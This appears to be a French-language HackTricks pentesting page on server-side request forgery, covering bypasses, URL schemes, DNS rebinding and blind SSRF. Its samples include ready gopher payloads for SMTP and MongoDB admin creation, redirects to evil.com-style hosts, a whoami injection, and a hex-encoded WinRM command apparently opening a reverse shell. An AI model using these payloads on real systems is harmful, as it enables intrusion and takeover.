# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Une vulnérabilité **Server-side Request Forgery (SSRF)** se produit lorsqu'un attaquant manipule une **application côté serveur** pour effectuer des **requêtes HTTP** vers un domaine de son choix. Cette vulnérabilité expose le serveur à des requêtes externes arbitraires dirigées par l'attaquant.

## Capturer SSRF

La première étape consiste à capturer une interaction SSRF générée par vous. Pour capturer une interaction HTTP ou DNS, vous pouvez utiliser des outils tels que :

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Contournement des domaines en liste blanche

Généralement, vous constaterez que le SSRF ne fonctionne que sur **certains domaines ou URL en liste blanche**. Dans la page suivante, vous avez une **compilation de techniques pour essayer de contourner cette liste blanche** :


{{#ref}}
url-format-bypass.md
{{#endref}}

### Contournement via Open Redirect

Si le serveur est correctement protégé vous pourriez **contourner toutes les restrictions en exploitant un Open Redirect sur la page web**. Parce que la page autorisera **SSRF vers le même domaine** et suivra probablement les **redirections**, vous pouvez exploiter l'Open Redirect pour faire en sorte que le serveur accède à n'importe quelle ressource interne.\
Read more here: [https://portswigger.net/web-security/ssrf]

## Protocoles

- **file://**
- Le schéma d'URL `file://` est mentionné, pointant directement vers `/etc/passwd` : `file:///etc/passwd`
- **dict://**
- Le schéma d'URL DICT est décrit comme étant utilisé pour accéder à des définitions ou des listes de mots via le protocole DICT. L'exemple illustre une URL construite ciblant un mot, une base de données et un numéro d'entrée spécifiques, ainsi qu'une instance de script PHP pouvant être détournée pour se connecter à un serveur DICT avec des identifiants fournis par l'attaquant : `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Identifié comme un protocole de transfert de fichiers sécurisé via SSH (secure shell), un exemple montre comment un script PHP pourrait être exploité pour se connecter à un serveur SFTP malveillant : `url=sftp://generic.com:11111/`
- **TFTP://**
- Le protocole Trivial File Transfer Protocol, fonctionnant sur UDP, est mentionné avec un exemple de script PHP conçu pour envoyer une requête à un serveur TFTP. Une requête TFTP est faite vers 'generic.com' sur le port '12346' pour le fichier 'TESTUDPPACKET' : `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Ce segment couvre le Lightweight Directory Access Protocol, en insistant sur son utilisation pour gérer et accéder à des services d'information d'annuaire distribués sur des réseaux IP. Interagissez avec un serveur LDAP sur localhost : `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Une méthode est décrite pour exploiter des vulnérabilités SSRF afin d'interagir avec des services SMTP sur localhost, incluant des étapes pour révéler les noms de domaine internes et des actions d'investigation supplémentaires basées sur ces informations.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Si le SSRF est exécuté par **curl**, curl possède une fonctionnalité appelée [**URL globbing**](https://everything.curl.dev/cmdline/globbing) qui peut être utile pour bypasser les WAFs. Par exemple dans ce [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) vous pouvez trouver cet exemple pour un **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- La capacité du protocole Gopher à spécifier IP, port et octets pour la communication avec un serveur est expliquée, ainsi que des outils comme Gopherus et remote-method-guesser pour créer des payloads. Deux usages distincts sont illustrés :

### Gopher://

En utilisant ce protocole vous pouvez spécifier les **IP, port et octets** que vous voulez que le serveur **envoie**. Ensuite, vous pouvez essentiellement exploiter une SSRF pour **communiquer avec n'importe quel serveur TCP** (mais vous devez d'abord savoir comment parler au service).\
Heureusement, vous pouvez utiliser [Gopherus](https://github.com/tarunkant/Gopherus) pour créer des payloads pour plusieurs services. De plus, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) peut être utilisé pour créer des _gopher_ payloads pour des services _Java RMI_.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect vers 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Créer un utilisateur avec username=admin, password=admin123 et permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & autres

Les logiciels d'analyse sur les serveurs consignent souvent le Referrer header pour suivre les liens entrants, une pratique qui expose involontairement les applications aux vulnérabilités Server-Side Request Forgery (SSRF). En effet, ces logiciels peuvent visiter les URL externes mentionnées dans le Referrer header pour analyser le contenu du site référent. Pour découvrir ces vulnérabilités, il est conseillé d'utiliser le plugin Burp Suite "**Collaborator Everywhere**", en tirant parti de la façon dont les outils d'analyse traitent le Referer header pour identifier d'éventuelles surfaces d'attaque SSRF.

## SSRF via données SNI du certificat

Une mauvaise configuration qui pourrait permettre la connexion à n'importe quel backend via une configuration simple est illustrée par un exemple de configuration Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
Dans cette configuration, la valeur du champ Server Name Indication (SNI) est directement utilisée comme adresse du backend. Cette configuration expose une vulnérabilité à Server-Side Request Forgery (SSRF), qui peut être exploitée en spécifiant simplement l'adresse IP ou le nom de domaine souhaité dans le champ SNI. L'exemple d'exploitation ci‑dessous montre comment forcer une connexion vers un backend arbitraire, tel que `internal.host.com`, en utilisant la commande `openssl` :
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF via TLS AIA CA Issuers (Java mTLS)

Certaines piles TLS téléchargeront automatiquement les CA intermédiaires manquantes en utilisant l'URI **Authority Information Access (AIA) → CA Issuers** présente dans le certificat du pair. Dans **Java**, activer `-Dcom.sun.security.enableAIAcaIssuers=true` lors de l'exécution d'un service mTLS fait que le serveur déréférence les URI contrôlées par l'attaquant depuis le certificat client **pendant la poignée de main**, avant que toute logique HTTP ne s'exécute.

- **Requirements**: mTLS enabled, Java AIA fetching enabled, attacker can present a client cert with a crafted AIA CA Issuers URI.
- **Triggering SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
La sortie de debug certpath de Java affiche `CertStore URI:http://localhost:8080`, et `nc` capture la requête HTTP avec le `User-Agent` contrôlable depuis `-Dhttp.agent`, prouvant le SSRF pendant la validation du certificat.
- **DoS via file://**: définir AIA CA Issuers sur `file:///dev/urandom` sur des hôtes de type Unix amène Java à le traiter comme un CertStore et à lire un flux infini d'octets aléatoires, occupant un cœur CPU et bloquant les connexions suivantes même après la déconnexion du client.

## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Il peut valoir la peine d'essayer une charge utile comme : `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDFs Rendering

Si la page web crée automatiquement un PDF avec des informations que vous avez fournies, vous pouvez **insérer du JS qui sera exécuté par le créateur de PDF** lui-même (le serveur) lors de la création du PDF, et vous pourrez abuser d'un SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

Créez plusieurs sessions et essayez de télécharger des fichiers lourds en exploitant le SSRF depuis les sessions.

## SSRF PHP Functions

Consultez la page suivante pour des fonctions PHP vulnérables et même des fonctions Wordpress :


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

Pour certaines exploitations, vous pourriez avoir besoin d'**envoyer une réponse de redirection** (éventuellement pour utiliser un protocole différent comme gopher). Voici différents codes python pour répondre avec une redirection:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Proxies mal configurés menant à SSRF

Astuces [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Code vulnérable du proxy Flask</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask permet d'utiliser **`@`** comme caractère initial, ce qui permet de faire du **nom d'hôte initial le nom d'utilisateur** et d'injecter un nouveau. Requête d'attaque :
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Code vulnérable:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Il a été découvert qu'il est possible de **démarrer le chemin** d'une requête avec le caractère **`;`**, ce qui permet ensuite d'utiliser **`@`** et d'injecter un nouvel hôte à atteindre. Requête d'attaque:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### Serveur web intégré PHP <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Code PHP vulnérable</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP permet l'utilisation du **caractère `*` avant un slash dans le chemin** de l'URL ; cependant, il présente d'autres limitations : il ne peut être utilisé que pour le chemin racine `/` et les points `.` ne sont pas autorisés avant le premier slash, il est donc nécessaire d'utiliser, par exemple, une adresse IP encodée en hexadécimal sans points :
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Si vous avez des **problèmes** pour **exfiltrer du contenu depuis une IP locale** à cause de **CORS/SOP**, **DNS Rebidding** peut être utilisé pour contourner cette limitation :


{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) est un outil pour réaliser des attaques de [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). Il inclut les composants nécessaires pour rebinder l'IP du nom DNS du serveur d'attaque vers l'IP de la machine cible et pour servir des payloads d'attaque afin d'exploiter des logiciels vulnérables sur la cible.

Consultez aussi le **serveur public en cours d'exécution sur** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Outbound TLS sessions**
- **Services sur des ports locaux**

Attack:

1. Demandez à l'utilisateur/bot d'**accéder** à un **domaine** contrôlé par l'**attaquant**.
2. Le **TTL** du **DNS** est **0** sec (donc la victime vérifiera bientôt à nouveau l'IP du domaine).
3. Une **connexion TLS** est établie entre la victime et le domaine de l'attaquant. L'attaquant introduit le **payload à l'intérieur** du **Session ID** ou du **Session Ticket**.
4. Le **domaine** lancera une **boucle infinie** de redirections vers lui-même. Le but est de faire accéder l'utilisateur/bot au domaine jusqu'à ce qu'il effectue **à nouveau** une **requête DNS** pour ce domaine.
5. Dans la requête DNS, une **IP privée** est retournée **maintenant** (127.0.0.1 par exemple).
6. L'utilisateur/bot tentera de **réétablir la connexion TLS** et, pour ce faire, il **enverra** le **Session ID / Ticket ID** (où le **payload** de l'attaquant était contenu). Félicitations : vous avez réussi à faire **l'utilisateur/bot s'attaquer lui-même**.

Notez que pendant cette attaque, si vous voulez attaquer localhost:11211 (_memcache_) vous devez faire établir à la victime la connexion initiale vers www.attacker.com:11211 (le **port doit toujours être le même**).\
Pour **effectuer cette attaque vous pouvez utiliser l'outil** : [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Pour **plus d'informations** regardez la conférence où cette attaque est expliquée : [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

La différence entre un blind SSRF et un SSRF non blind est que dans le blind vous ne pouvez pas voir la réponse de la requête SSRF. Il est donc plus difficile à exploiter car vous ne pourrez exploiter que des vulnérabilités bien connues.

### Time based SSRF

En **vérifiant le temps** des réponses du serveur, il peut être **possible de savoir si une ressource existe ou non** (peut‑être que l'accès à une ressource existante prend plus de temps que l'accès à une qui n'existe pas).

### From blind to full abusing status codes

Selon ce [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), certains blind SSRF peuvent survenir parce que même si l'URL ciblée répond avec un code de statut 200 (comme les metadata AWS), ces données ne sont pas correctement formatées et l'application peut refuser de les afficher.

Cependant, il a été trouvé qu'en renvoyant des réponses de redirection avec des codes entre 305 et 309 via le SSRF, il peut être possible de faire en sorte que l'application **suive ces redirections tout en passant en mode erreur** qui n'effectuera plus la vérification du format des données et pourrait simplement les afficher.

Le serveur Python utilisé pour exploiter cela est le suivant :
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Étapes :**
- D'abord 302 fait démarrer l'application pour commencer à suivre.
- Ensuite elle reçoit 305 → 306 → 307 → 308 → 309 → 310.
- Après le 5e code étrange le PoC renvoie finalement 302 → 169.254.169.254 → 200 OK.

**Ce qui se passe à l'intérieur de la cible :**
- libcurl lui‑même suit 305–310 ; il normalise simplement les codes inconnus en “follow.”
- Après N redirections bizarres (≥ 5 ici) le wrapper de l'application décide “quelque chose cloche” et passe en mode erreur destiné au debugging.
- Dans ce mode il dumps toute la chaîne de redirections plus le body final vers l'appelant externe.
- Résultat : l'attaquant voit chaque header + le metadata JSON, mission accomplie.

Notez que ceci est intéressant pour leak des codes d'état que vous ne pouviez pas leak auparavant (comme un 200). Cependant, si d'une façon ou d'une autre vous pouviez aussi sélectionner le code d'état de la réponse (imaginez que vous puissiez décider que les AWS metadata répondent avec un code d'état 500), **il pourrait y avoir certains codes d'état qui provoquent un leak direct du contenu de la réponse.**

### Moteurs HTML-to-PDF comme gadgets SSRF aveugles

Des bibliothèques comme **TCPDF** (et des wrappers comme **spipu/html2pdf**) vont automatiquement récupérer toute URL présente dans un HTML contrôlé par l'attaquant lors du rendu d'un PDF. Chaque attribut `<img>` ou `<link rel="stylesheet">` est résolu côté serveur via cURL, `getimagesize()`, ou `file_get_contents()`, donc vous pouvez pousser le worker PDF à sonder des hôtes internes même si aucune réponse HTTP ne vous est reflétée.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 effectue plusieurs tentatives de récupération pour chaque `<img>` resource, donc un seul payload peut générer plusieurs requêtes (utile pour des scans de ports basés sur le timing).
- html2pdf copie le comportement de TCPDF pour `<img>` et ajoute la récupération CSS inside `Css::extractStyle()`, qui appelle simplement `file_get_contents($href)` après une vérification superficielle du scheme. Abuse it pour toucher des loopback services, des plages RFC1918, ou des cloud metadata endpoints.
- Combinez ce primitive SSRF avec les [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) pour leak à la fois des réponses HTTP internes et des fichiers locaux rendus dans le PDF.

Les équipes chargées du durcissement doivent supprimer les URL externes avant le rendu ou isoler le renderer dans un sandbox réseau ; en attendant, considérez les générateurs de PDF comme des proxys SSRF aveugles.

## Exploitation SSRF dans le cloud

Si vous trouvez une vulnérabilité SSRF sur une machine exécutée dans un environnement cloud, vous pourriez être en mesure d'obtenir des informations intéressantes sur l'environnement cloud et même des identifiants :


{{#ref}}
cloud-ssrf.md
{{#endref}}

## Plateformes vulnérables à SSRF

Plusieurs plateformes connues contiennent ou ont contenu des vulnérabilités SSRF, consultez-les dans :


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Outils

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Outil pour détecter et exploiter des vulnérabilités SSRF

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

This tool generates Gopher payloads for:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ est un scanner de vulnérabilités _Java RMI_ qui prend en charge les opérations d'attaque pour la plupart des vulnérabilités _Java RMI_ courantes. La plupart des opérations disponibles supportent l'option `--ssrf`, pour générer un payload _SSRF_ pour l'opération demandée. Avec l'option `--gopher`, des payloads _gopher_ prêts à l'emploi peuvent être générés directement.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy est un serveur proxy HTTP multi-thread conçu pour tunneliser le trafic HTTP client à travers des serveurs HTTP vulnérables à la Server-Side Request Forgery (SSRF).

### Pour pratiquer


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Références

